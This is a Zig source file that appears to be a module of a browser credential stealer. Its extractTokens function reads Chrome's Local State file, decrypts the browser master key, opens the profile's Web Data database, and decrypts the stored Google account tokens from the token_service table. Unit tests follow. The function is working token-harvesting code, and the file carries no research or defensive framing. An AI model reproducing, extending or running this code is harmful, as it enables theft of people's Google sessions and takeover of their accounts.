const std = @import("std");
const sqLoot = @import("../parsers/sqLoot.zig");
const chrome_key = @import("../crypto/chrome_key.zig");
const chrome_crypto = @import("../crypto/chrome_crypto.zig");
const file_io = @import("../parsers/file_io.zig");

pub const GoogleToken = struct {
    gaia_id: []const u8,
    token: []const u8,
};

fn findColumnIndex(db: *sqLoot.SqliteDb, table: []const u8, name: []const u8, allocator: std.mem.Allocator) ?usize {
    const cols = db.getColumnNames(table) catch return null;
    defer {
        for (cols) |c| allocator.free(c);
        allocator.free(cols);
    }
    for (cols, 0..) |col, i| {
        if (std.mem.eql(u8, col, name)) return i;
    }
    return null;
}

pub fn extractTokens(profile_path: []const u8, allocator: std.mem.Allocator) ![]GoogleToken {
    const local_state_path = try std.mem.concat(allocator, u8, &[_][]const u8{ profile_path, "\\..\\Local State" });
    defer allocator.free(local_state_path);

    const ls_mapped = file_io.MappedFile.open(local_state_path) orelse return &[_]GoogleToken{};
    defer ls_mapped.close();
    const json = ls_mapped.slice();

    var b64_buf: [4096]u8 = undefined;
    const encrypted_key = chrome_key.extractEncryptedKey(json, &b64_buf) orelse return &[_]GoogleToken{};

    var key_buf: [256]u8 = undefined;
    const master_slice = chrome_crypto.decryptEncryptedKey(encrypted_key, &key_buf) orelse return &[_]GoogleToken{};

    var master_key: [32]u8 = undefined;
    @memset(&master_key, 0);
    const copy_len = @min(master_slice.len, master_key.len);
    @memcpy(master_key[0..copy_len], master_slice[0..copy_len]);

    const wd_path = try std.mem.concat(allocator, u8, &[_][]const u8{ profile_path, "\\Web Data" });
    defer allocator.free(wd_path);

    const mapped = file_io.MappedFile.open(wd_path) orelse return &[_]GoogleToken{};
    defer mapped.close();

    var db = sqLoot.SqliteDb.open(allocator, mapped.slice()) catch return &[_]GoogleToken{};
    defer db.deinit();

    const rows = db.readTable("token_service") catch return &[_]GoogleToken{};
    defer allocator.free(rows);

    const gaia_idx = findColumnIndex(&db, "token_service", "gaia_id", allocator) orelse return &[_]GoogleToken{};
    const token_idx = findColumnIndex(&db, "token_service", "encrypted_token", allocator) orelse return &[_]GoogleToken{};

    var tokens = std.ArrayList(GoogleToken).init(allocator);
    errdefer {
        for (tokens.items) |t| {
            allocator.free(t.gaia_id);
            allocator.free(t.token);
        }
        tokens.deinit();
    }

    for (rows) |row| {
        if (row.len <= @max(gaia_idx, token_idx)) continue;
        const gaia = if (row[gaia_idx] != .null and row[gaia_idx] == .text) row[gaia_idx].text else "";
        const enc = if (row[token_idx] != .null and row[token_idx] == .blob) row[token_idx].blob else continue;

        var decrypt_buf = try allocator.alloc(u8, enc.len);
        defer allocator.free(decrypt_buf);
        const decrypted = chrome_crypto.decryptPassword(enc, master_key, decrypt_buf) orelse continue;

        const gaia_dup = try allocator.dupe(u8, gaia);
        errdefer allocator.free(gaia_dup);
        const token_dup = try allocator.dupe(u8, decrypted);
        errdefer allocator.free(token_dup);

        try tokens.append(GoogleToken{
            .gaia_id = gaia_dup,
            .token = token_dup,
        });
    }

    return tokens.toOwnedSlice();
}

test "extractTokens returns empty for nonexistent path" {
    const result = try extractTokens("C:\\__nonexistent__", std.testing.allocator);
    defer {
        for (result) |t| {
            std.testing.allocator.free(t.gaia_id);
            std.testing.allocator.free(t.token);
        }
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "extractTokens handles empty profile directory" {
    const tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const tmp_path = tmp.dir.realpathAlloc(std.testing.allocator, ".") catch return;
    defer std.testing.allocator.free(tmp_path);
    const result = try extractTokens(tmp_path, std.testing.allocator);
    defer {
        for (result) |t| {
            std.testing.allocator.free(t.gaia_id);
            std.testing.allocator.free(t.token);
        }
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "GoogleToken struct is valid" {
    const token = GoogleToken{
        .gaia_id = "test_gaia",
        .token = "test_token",
    };
    try std.testing.expectEqualSlices(u8, "test_gaia", token.gaia_id);
    try std.testing.expectEqualSlices(u8, "test_token", token.token);
}

test "findColumnIndex returns null for nonexistent table" {
    var empty_data: [200]u8 = undefined;
    @memcpy(empty_data[0..16], sqLoot.SQLITE_MAGIC);
    std.mem.writeInt(u16, empty_data[16..18], 4096, .big);
    for (18..200) |i| empty_data[i] = 0;
    var db = sqLoot.SqliteDb.open(std.testing.allocator, &empty_data) catch return;
    defer db.deinit();
    const idx = findColumnIndex(&db, "no_such_table", "col", std.testing.allocator);
    try std.testing.expect(idx == null);
}
